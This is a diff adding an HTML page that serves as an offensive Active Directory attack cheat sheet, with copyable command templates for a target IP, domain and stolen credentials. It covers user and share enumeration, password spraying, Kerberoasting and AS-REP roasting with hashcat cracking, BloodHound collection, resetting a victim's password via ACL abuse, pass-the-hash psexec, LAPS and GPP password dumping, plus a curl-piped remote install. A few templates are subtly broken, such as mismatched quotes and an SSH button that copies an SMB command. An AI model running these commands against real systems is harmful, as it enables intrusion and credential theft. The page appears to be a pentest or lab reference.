@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Active Directory Enumeration</title>
+    <link rel="stylesheet" href="styles.css">
+    <script>
+        // Function to update commands dynamically
+        function updateCommands() {
+            let ip = document.getElementById("ipInput").value || "<IP>";
+            let dcip = document.getElementById("dcipInput").value || "<DCIP>";
+            let addomain = document.getElementById("addomainInput").value || "<ADDOMAIN>";
+            let username = document.getElementById("usernameInput").value || "<USERNAME>";
+            let password = document.getElementById("passwordInput").value || "<PASSWORD>";
+                let shares = document.getElementById("sharesInput").value || "<SHARES>";
+            let commandElements = document.querySelectorAll(".command");
+
+            commandElements.forEach(element => {
+                let baseCommand = element.getAttribute("data-base");
+                element.textContent = baseCommand
+                    .replace("{IP}", ip)
+                    .replace("{DCIP}", dcip)
+                    .replace("{ADDOMAIN}", addomain)
+                    .replace("{USERNAME}", username)
+                    .replace("{PASSWORD}", password)
+                    .replace("{SHARES}", shares);
+            });
+        }
+
+        // Function to copy command to clipboard
+        function copyToClipboard(command) {
+            // Replace placeholders with actual values
+            let ip = document.getElementById("ipInput").value || "<IP>";
+            let dcip = document.getElementById("dcipInput").value || "<DCIP>";
+            let addomain = document.getElementById("addomainInput").value || "<ADDOMAIN>";
+            let username = document.getElementById("usernameInput").value || "<USERNAME>";
+            let password = document.getElementById("passwordInput").value || "<PASSWORD>";
+            let shares = document.getElementById("sharesInput").value || "<SHARES>";
+
+            command = command
+                .replace("{IP}", ip)
+                .replace("{DCIP}", dcip)
+                .replace("{ADDOMAIN}", addomain)
+                .replace("{USERNAME}", username)
+                .replace("{PASSWORD}", password)
+                .replace("{SHARES}", shares);
+
+            // Copy to clipboard
+            navigator.clipboard.writeText(command).then(() => {
+                // Show feedback (tooltip or message)
+                showFeedback("Command copied to clipboard!");
+            }).catch(err => {
+                console.error("Failed to copy: ", err);
+            });
+        }
+
+        // Function to show feedback (e.g., tooltip or message)
+        function showFeedback(message) {
+            let feedback = document.createElement("div");
+            feedback.textContent = message;
+            feedback.style.position = "fixed";
+            feedback.style.bottom = "20px";
+            feedback.style.left = "50%";
+            feedback.style.transform = "translateX(-50%)";
+            feedback.style.backgroundColor = "#4caf50";
+            feedback.style.color = "#fff";
+            feedback.style.padding = "10px 20px";
+            feedback.style.borderRadius = "5px";
+            feedback.style.zIndex = "1000";
+            feedback.style.boxShadow = "0 2px 10px rgba(0, 0, 0, 0.3)";
+            document.body.appendChild(feedback);
+
+            // Remove feedback after 2 seconds
+            setTimeout(() => {
+                feedback.remove();
+            }, 2000);
+        }
+
+        // Initialize commands on page load
+        document.addEventListener("DOMContentLoaded", updateCommands);
+    </script>
+</head>
+<body>
+    <!-- Side Navigation -->
+    <div class="side-nav">
+        <h2>Categories</h2>
+        <ul>
+            <li><a href="index.html" target="_blank">Main</a></li>
+            <li><a href="null-ad-enum.html" target="_blank">AD NULL Enumeration</a></li>
+            <li><a href="#Initial">AD Initial Enumeration</a></li>
+            <li><a href="#userenum">AD Users Enumeration</a></li>
+            <li><a href="#groupenum">AD Group Enumeration</a></li>
+            <li><a href="#passwordspray">Password Spraying</a></li>
+            <li><a href="#kerberos">Kerberos Attacks</a></li>
+            <li><a href="#bloodhound">BloodHound</a></li>
+            <li><a href="#acl">ACL Abuse</a></li>
+            <li><a href="#remoteaccess">Remote Access</a></li>
+            <li><a href="windows-privesc.html" target="_blank">Windows PE</a></li>
+            <li><a href="seimpersonate.html" target="_blank">Seimpersonate</a></li>
+            <li><a href="hashdump.html" target="_blank">Windows Hash Dump</a></li>
+        </ul>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content">
+        <h2>AD Enumeration Commands</h2>
+        <label for="ipInput">Target IP:</label>
+        <input type="text" id="ipInput" placeholder="e.g., 192.168.1.100" oninput="updateCommands()">
+
+        <label for="dcipInput">Target DC-IP:</label>
+        <input type="text" id="dcipInput" placeholder="e.g., 192.168.1.100" oninput="updateCommands()">
+
+        <label for="addomainInput">AD Domain Name:</label>
+        <input type="text" id="addomainInput" placeholder="e.g., company.local" oninput="updateCommands()">
+
+        <label for="usernameInput">Username:</label>
+        <input type="text" id="usernameInput" placeholder="e.g., j.smith" oninput="updateCommands()">
+
+        <label for="passwordInput">Password:</label>
+        <input type="text" id="passwordInput" placeholder="e.g., P@$$w0rd1" oninput="updateCommands()">
+
+        <label for="sharesInput">SMB Shares:</label>
+        <input type="text" id="sharesInput" placeholder="e.g., HELPDESK" oninput="updateCommands()">
+
+        <!-- Initial_Enumeration -->
+        <div id="Initial">
+            <h3>Initial Enumeration</h3>
+            <div class="command-container">
+        
+                <div class="description">
+                    <strong>Check if user is valid:</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="nxc smb {IP} -u {USERNAME} -p '{PASSWORD}'"> <IP></span>
+                    <button onclick="copyToClipboard(`nxc smb {IP} -u {USERNAME} -p '{PASSWORD}'`)">📄</button>
+                </div>
+
+                <div class="description">
+                    <strong>Check for local auth:</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="nxc smb {IP} -u {USERNAME} -p '{PASSWORD}' --local-auth"> <IP></span>
+                    <button onclick="copyToClipboard(`nxc smb {IP} -u {USERNAME} -p '{PASSWORD}' --local-auth`)">📄</button>
+                </div>
+
+                <div class="description">
+                    <strong>Enum4linux-ng:</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="enum4linux-ng {IP} -u {USERNAME} -p '{PASSWORD}' -A "> <IP></span>
+                    <button onclick="copyToClipboard(`enum4linux-ng {IP} -u {USERNAME} -p '{PASSWORD}' -A`)">📄</button>
+                </div>
+
+                    <div class="description">
+                        <strong>Check for SMB shares:</strong>
+                    </div>
+                    <div class="command-box">
+                        <span class="command" data-base="nxc smb {IP} -u {USERNAME} -p '{PASSWORD}' --shares"> <IP></span>
+                        <button onclick="copyToClipboard(`nxc smb {IP} -u {USERNAME} -p '{PASSWORD}' --shares`)">📄</button>
+                    </div>
+                    
+                    <div class="command-box">
+                        <span class="command" data-base="nxc smb {IP} -u {USERNAME} -p '{PASSWORD}' -M spider_plus --share '{SHARES}'"> <IP></span>
+                        <button onclick="copyToClipboard(`nxc smb {IP} -u {USERNAME} -p '{PASSWORD}' -M spider_plus --share '{SHARES}'`)">📄</button>
+                    </div>
+
+                    <div class="description">
+                        <strong>SMBClient Access:</strong> 
+                    </div>
+                    <div class="command-box">
+                        <span class="command" data-base="smbclient //{IP}/{SHARES} -U {USERNAME}%'{PASSWORD}'"> </span>
+                        <button onclick="copyToClipboard(`smbclient \/\/{IP}/{SHARES} -U {USERNAME}%'{PASSWORD}'`)">📄</button>
+                    </div>
+                    <div class="command-box">
+                        <span class="command" data-base="prompt; recurse; mget *"> </span>
+                        <button onclick="copyToClipboard(`prompt; recurse; mget *`)">📄</button>
+                    </div>
+
+                    <div class="description">
+                        <strong>Check for FTP access:</strong> 
+                    </div>
+                    <div class="command-box">
+                        <span class="command" data-base="nxc ftp {IP} -u {USERNAME} -p '{PASSWORD}'"> <IP></span>
+                        <button onclick="copyToClipboard(`nxc ftp {IP} -u {USERNAME} -p '{PASSWORD}'`)">📄</button>
+                    </div>
+                    <div class="command-box">
+                        <span class="command" data-base="nxc ftp {IP} -u {USERNAME} -p '{PASSWORD}' --ls"> <IP></span>
+                        <button onclick="copyToClipboard(`nxc ftp {IP} -u {USERNAME} -p '{PASSWORD}' --ls`)">📄</button>
+                    </div>
+
+                    <div class="description">
+                        <strong>Check for SSH access:</strong> 
+                    </div>
+                    <div class="command-box">
+                        <span class="command" data-base="nxc ssh {IP} -u {USERNAME} -p '{PASSWORD}'"> <IP></span>
+                        <button onclick="copyToClipboard(`nxc ssh {IP} -u {USERNAME} -p '{PASSWORD}'`)">📄</button>
+                    </div>
+                    
+
+                    
+                
+                
+                <div class="description">
+                    <strong>Check if user has winrm access:</strong>
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="evil-winrm -i {IP} -u '{USERNAME}' -p '{PASSWORD}'"> </span>
+                    <button onclick="copyToClipboard(`evil-winrm -i {IP} -u '{USERNAME}' -p '{PASSWORD}'`)">📄</button>
+                </div>
+
+                <div class="description">
+                    <strong>Check if user has RDP access:</strong>
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="xfreerdp3 /u:{USERNAME} /p:'{PASSWORD}' /v:{IP} +clipboard /dynamic-resolution /cert:ignore"> </span>
+                    <button onclick="copyToClipboard(`xfreerdp3 \/u:{USERNAME} \/p:'{PASSWORD}' \/v:{IP} +clipboard \/dynamic-resolution \/cert:ignore`)">📄</button>
+                </div>
+
+                <div class="description">
+                    <strong>Check if user has SSH access:</strong>
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="nxc ssh {IP} -u {USERNAME} -p '{PASSWORD}' "> <IP></span>
+                    <button onclick="copyToClipboard(`nxc smb {IP} -u {USERNAME} -p '{PASSWORD}' `)">📄</button>
+                </div>
+
+                <div class="description">
+                    <strong>Check if user has MSSQL access:</strong>
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="nxc mssql {IP} -u {USERNAME} -p '{PASSWORD}' --local-auth"> <IP></span>
+                    <button onclick="copyToClipboard(`nxc mssql {IP} -u {USERNAME} -p '{PASSWORD}' --local-auth`)">📄</button>
+                </div>
+
+                </div>
+        
+        <!-- User Enumeration -->
+        <div id="userenum">
+            <h3>User Enumeration</h3>
+            <div class="command-container">
+                
+                <div class="description">
+                    <strong>User enumeration with NXC:</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="nxc smb {IP} -u {USERNAME} -p '{PASSWORD}' --users"> <IP></span>
+                    <button onclick="copyToClipboard(`nxc smb {IP} -u {USERNAME} -p '{PASSWORD}' --users`)">📄</button>
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="nxc smb {IP} -u {USERNAME} -p '{PASSWORD}' --loggedon-users"> <IP></span>
+                        <button onclick="copyToClipboard(`nxc smb {IP} -u {USERNAME} -p '{PASSWORD}' --loggedon-users`)">📄</button>
+                </div>
+
+                <div class="description">
+                    <strong>LDAP Domain Dump:</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="ldapdomaindump -u {ADDOMAIN}\\{USERNAME} -p '{PASSWORD}' ldap://{DCIP}"> </span>
+                        <button onclick="copyToClipboard(`mkdir ldapdomaindump;cd ldapdomaindump;python3 /usr/bin/ldapdomaindump -u {ADDOMAIN}\\\\{USERNAME} -p '{PASSWORD}' ldap:\/\/{DCIP}`)">📄</button>
+                </div>
+
+                <div class="description">
+                    <strong>User enumeration with RID Bruteforce:</strong>
+                </div>
+
+                <div class="command-box">
+                    <span class="command" data-base="nxc smb {IP} -u '{USERNAME}' -p '{PASSWORD}' --rid-brute --log nxc_rid.brute"> </span>
+                    <button onclick="copyToClipboard(`nxc smb {IP} -u '{USERNAME}' -p '{PASSWORD}' --rid-brute --log nxc_rid.brute`)">📄</button>
+                </div>
+
+                <div class="command-box">
+                    <span class="command" data-base="sed -n 's/.*\\\\\\([^ ]*\\) (SidTypeUser)/\\1/p' nxc_rid.brute > nxc_rid_brute ; cat nxc_rid_brute ; echo '' ;wc -l nxc_rid_brute"> </span>
+                    <button onclick="copyToClipboard(`sed -n 's/.*\\\\\\([^ ]*\\) (SidTypeUser)/\\1/p' nxc_rid.brute > nxc_rid_brute ; cat nxc_rid_brute ; echo '' ;wc -l nxc_rid_brute`)">📄</button>
+                </div>
+                
+                <div class="command-box">
+                    <span class="command" data-base="lookupsid.py '/{USERNAME}:{PASSWORD}'@{IP}'"></span>
+                    <button onclick="copyToClipboard(`lookupsid.py '/\{USERNAME\}:\{PASSWORD\}'@\{IP\}`)">📄</button>
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="lookupsid.py '/{USERNAME}:{PASSWORD}'@{IP} > lookupsid.list"> </span>
+                    <button onclick="copyToClipboard(`lookupsid.py '/{USERNAME}:{PASSWORD}'@{IP} > lookupsid.list`)">📄</button>
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="sed -n 's/.*\\\([^ ]*\) (SidTypeUser).*/\1/p' lookupsid.list > lookupsid_list ; cat lookupsid_list ; echo '' ; wc -l lookupsid_list
+                        "> <IP></span>
+                        <button onclick="copyToClipboard(`sed -n \'s/.*\\\\\\([^ ]*\\) (SidTypeUser).*/\\1/p\' lookupsid.list > lookupsid_list ; cat lookupsid_list ; echo ''; wc -l lookupsid_list`)" >📄</button>
+                </div>
+
+                <div class="description">
+                    <strong>User enumeration with rpcclient:</strong>
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="rpcclient -U '{USERNAME}%{PASSWORD}' {IP} -c enumdomusers"></span>
+                    <button onclick="copyToClipboard(`rpcclient -U '{USERNAME}%{PASSWORD}' {IP} -c enumdomusers`)">📄</button>
+
+                </div>
+
+                <div class="description">
+                    <strong>User enumeration with Get-ADUsers:</strong>
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="impacket-GetADUsers -all {ADDOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DCIP}"></span>
+                    <button onclick="copyToClipboard(`impacket-GetADUsers -all {ADDOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DCIP}`)">📄</button>
+
+                </div>
+                <div class="description">
+                    <strong>Kerbrute:</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="/home/kali/tools/kerbrute userenum -d {ADDOMAIN} --dc {DCIP} users.txt"> <IP></span>
+                    <button onclick="copyToClipboard(`/home/kali/tools/kerbrute userenum -d {ADDOMAIN} --dc {DCIP} users.txt`)">📄</button>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- Group Enumeration -->
+        <div id="groupenum">
+            <h3>Group Enumeration</h3>
+            <div class="command-container">
+                
+                <div class="description">
+                    <strong>Group enumeration with NXC:</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="nxc smb {IP} -u {USERNAME} -p '{PASSWORD}' --groups"> <IP></span>
+                        <button onclick="copyToClipboard(`nxc smb {IP} -u {USERNAME} -p '{PASSWORD}' --groups`)">📄</button>
+                </div>
+        
+        <!-- Password Spray -->
+        <div id="passwordspray">
+            <h3>Password Spray</h3>
+            
+            <div class="command-container">
+                <!-- NXC -->
+                <div class="description">
+                    <strong>Password spray with NXC:</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="nxc smb {IP} -u users.txt -p '{PASSWORD}' --continue-on-success"> <IP></span>
+                    <button onclick="copyToClipboard(`nxc smb {IP} -u users.txt -p '{PASSWORD}' --continue-on-success`)">📄</button>
+                </div>
+            </div>
+
+            <div class="command-container">
+                <!-- NXC -->
+                <div class="description">
+                    <strong>Password spray with usernames:</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="nxc smb {IP} -u users.txt -p users.txt --continue-on-success"> <IP></span>
+                    <button onclick="copyToClipboard(`nxc smb {IP} -u users.txt -p users.txt --continue-on-success`)">📄</button>
+                </div>
+            </div>
+
+            <div class="command-container">
+                <!-- NXC -->
+                <div class="description">
+                    <strong>Password spray with empty passwords:</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="nxc smb {IP} -u users.txt -p '' --continue-on-success"> <IP></span>
+                    <button onclick="copyToClipboard(`nxc smb {IP} -u users.txt -p '' --continue-on-success`)">📄</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Kerberos Attacks -->
+        <div id="kerberos">
+            <h3>Kerberos Attacks</h3>
+            <div class="command-container">
+        
+                <div class="description">
+                    <strong>Kerberoast: NXC</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="nxc ldap {DCIP} -u {USERNAME} -p '{PASSWORD}' --kerberoasting kerberoasting_nxc.txt"> </span>
+                    <button onclick="copyToClipboard(`nxc ldap {DCIP} -u {USERNAME} -p '{PASSWORD}' --kerberoasting kerberoasting_nxc.txt`)">📄</button>
+                </div>
+                <div class="description">
+                    <strong>Kerberoast: Impacket</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="impacket-GetUserSPNs {ADDOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DCIP} -request -outputfile hashes.kerberoast"> </span>
+                    <button onclick="copyToClipboard(`impacket-GetUserSPNs {ADDOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DCIP} -request -outputfile hashes.kerberoast`)">📄</button>
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="impacket-GetUserSPNs {ADDOMAIN}/{USERNAME}:'{PASSWORD}' -k -dc-ip {DCIP} -request -outputfile hashes.kerberoast"> </span>
+                    <button onclick="copyToClipboard(`impacket-GetUserSPNs {ADDOMAIN}/{USERNAME}:'{PASSWORD}' -k -dc-ip {DCIP} -request -outputfile hashes.kerberoast`)">📄</button>
+                </div>
+
+                <div class="description">
+                    <strong>Kerberoast hash cracking:</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force"> </span>
+                    <button onclick="copyToClipboard(`hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force`)">📄</button>
+                </div>
+
+                <div class="description">
+                    <strong>KRB_AP_ERR_SKEW(Clock skew too great):</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="faketime &quot;$(ntpdate -q dc01.{ADDOMAIN} | cut -d &apos; &apos; -f 1,2)&quot; impacket-GetUserSPNs {ADDOMAIN}/{USERNAME}:&apos;{PASSWORD}&apos; -k -dc-ip {DCIP} -request -outputfile hashes.kerberoast"> </span>
+                    <button onclick="copyToClipboard(`faketime &quot;$(ntpdate -q dc01.{ADDOMAIN} | cut -d &apos; &apos; -f 1,2)&quot; impacket-GetUserSPNs {ADDOMAIN}/{USERNAME}:&apos;{PASSWORD}&apos; -k -dc-ip {DCIP} -request -outputfile hashes.kerberoast`)">📄</button>
+                </div>
+
+                <div class="description">
+                    <strong>AS-Rep roast: NXC</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="nxc ldap {DCIP} -u {USERNAME} -p '{PASSWORD}' --asreproast asreproast_output.txt"> </span>
+                    <button onclick="copyToClipboard(`nxc ldap {DCIP} -u {USERNAME} -p '{PASSWORD}' --asreproast asreproast_output.txt`)">📄</button>
+                </div>
+                <div class="description">
+                    <strong>AS-Rep roast: Impacket</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="impacket-GetNPUsers {ADDOMAIN}/{USERNAME}:'{PASSWORD}' -request -dc-ip {DCIP} -format hashcat -outputfile hashes.asreproast"> </span>
+                    <button onclick="copyToClipboard(`impacket-GetNPUsers {ADDOMAIN}/{USERNAME}:'{PASSWORD}' -request -dc-ip {DCIP} -format hashcat -outputfile hashes.asreproast`)">📄</button>
+                </div>
+
+                <div class="description">
+                    <strong>AS-REP hash cracking:</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"> </span>
+                    <button onclick="copyToClipboard(`hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`)">📄</button>
+                </div>
+
+                
+
+            </div>
+        </div>
+
+        <!-- Bloodhound -->
+        <div id="bloodhound">
+            <h3>BloodHound</h3>
+            <div class="command-container">
+        
+                <div class="description">
+                    <strong>Collect BloodHound Data:</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="bloodhound-python -d {ADDOMAIN} -u {USERNAME} -p '{PASSWORD}' -ns {DCIP} -c all"> </span>
+                    <button onclick="copyToClipboard(`mkdir bloodhound;cd bloodhound; bloodhound-python -d {ADDOMAIN} -u {USERNAME} -p '{PASSWORD}' -ns {DCIP} -c all`)">📄</button>
+                </div>
+                <div class="description">
+                    <strong>Start BloodHound Server:</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="sudo curl -L https://ghst.ly/getbhce | sudo docker-compose -f - up "> </span>
+                    <button onclick="copyToClipboard(`sudo curl -L https://ghst.ly/getbhce | sudo docker-compose -f - up `)">📄</button>
+                </div>
+                <div class="description">
+                    <strong>BloodHound Server Password:</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="Password1236! "> </span>
+                    <button onclick="copyToClipboard(`Password1236! `)">📄</button>
+                </div>
+
+            </div>
+        </div>
+
+
+        <div id="acl">
+            <h3>ACL Abuse</h3>
+            <div class="command-container">
+        
+                <div class="description">
+                    <strong>GenericAll:</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base='net rpc password "[VICTIM]" "newP@ssword2022" -U "{ADDOMAIN}"/"{USERNAME}"%"{PASSWORD}" -S "{ADDOMAIN}"'> </span>
+                    <button onclick="copyToClipboard('net rpc password &quot;[VICTIM]&quot; &quot;newP@ssword2022&quot; -U &quot;{ADDOMAIN}&quot;/&quot;{USERNAME}&quot;%&quot;{PASSWORD}&quot; -S &quot;{ADDOMAIN}&quot;')">📄</button>
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base='bloodyAD --host "{DCIP}" -d "{ADDOMAIN}" -u "{USERNAME}" -p ${PASSWORD}" set password "$TargetUser" "newP@ssword2022"'> </span>
+                    <button onclick="copyToClipboard('bloodyAD --host &quot;{DCIP}&quot; -d &quot;{ADDOMAIN}&quot; -u &quot;{USERNAME}&quot; -p ${PASSWORD}&quot; set password &quot;$TargetUser&quot; &quot;newP@ssword2022&quot;')">📄</button>
+                </div>
+
+            </div>
+        </div>
+
+
+        <!-- Remote Access -->
+        <div id="remoteaccess">
+            <h3>Remote Access</h3>
+            <div class="command-container">
+        
+                <div class="description">
+                    <strong>EvilWinRm:</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="evil-winrm -i {IP} -u '{USERNAME}' -p '{PASSWORD}'"> </span>
+                    <button onclick="copyToClipboard(`evil-winrm -i {IP} -u '{USERNAME}' -p '{PASSWORD}'`)">📄</button>
+                </div>
+
+                <div class="description">
+                    <strong>RDP access:</strong>
+                </div>
+
+                <div class="command-box">
+                    <span class="command" data-base="xfreerdp3 /u:{USERNAME} /p:'{PASSWORD}' /v:{IP} +clipboard /dynamic-resolution /cert:ignore"> </span>
+                    <button onclick="copyToClipboard(`xfreerdp3 \/u:{USERNAME} \/p:'{PASSWORD}' \/v:{IP} +clipboard \/dynamic-resolution \/cert:ignore`)">📄</button>
+                </div>
+
+                <div class="description">
+                    <strong>MSSQL access:</strong>
+                </div>
+
+                <div class="command-box">
+                    <span class="command" data-base="mssqlclient.py {ADDOMAIN}/{USERNAME}:'{PASSWORD}'@{IP} -windows-auth"> </span>
+                    <button onclick="copyToClipboard(`mssqlclient.py {ADDOMAIN}/{USERNAME}:'{PASSWORD}'@{IP} -windows-auth`)">📄</button>
+                </div>
+
+                <div class="description">
+                    <strong>PSEXEC: with hash</strong>
+                </div>
+
+                <div class="command-box">
+                    <span class="command" data-base="impacket-psexec '{USERNAME}'@{IP} -hashes :[HASH]"> </span>
+                    <button onclick="copyToClipboard(`impacket-psexec '{USERNAME}'@{IP} -hashes :[HASH]`)">📄</button>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- Final Checks -->
+        <div id="final">
+            <h3>Final Checks</h3>
+            <div class="command-container">
+        
+                <div class="description">
+                    <strong>Check if user can read LAPS password:</strong> 
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="nxc smb {IP} -u {USERNAME} -p '{PASSWORD}' --laps"> </span>
+                    <button onclick="copyToClipboard(`nxc smb {IP} -u {USERNAME} -p '{PASSWORD}' --laps`)">📄</button>
+                </div>
+
+                <div class="description">
+                    <strong>GPP Password:</strong>
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base="nxc smb {DCIP} -u {USERNAME} -p '{PASSWORD}' -M gpp_password"> </span>
+                    <button onclick="copyToClipboard(`nxc smb {DCIP} -u {USERNAME} -p '{PASSWORD}' -M gpp_password`)">📄</button>
+                </div>
+
+            </div>
+        </div>
+
+    </div>
+</body>
+</html>
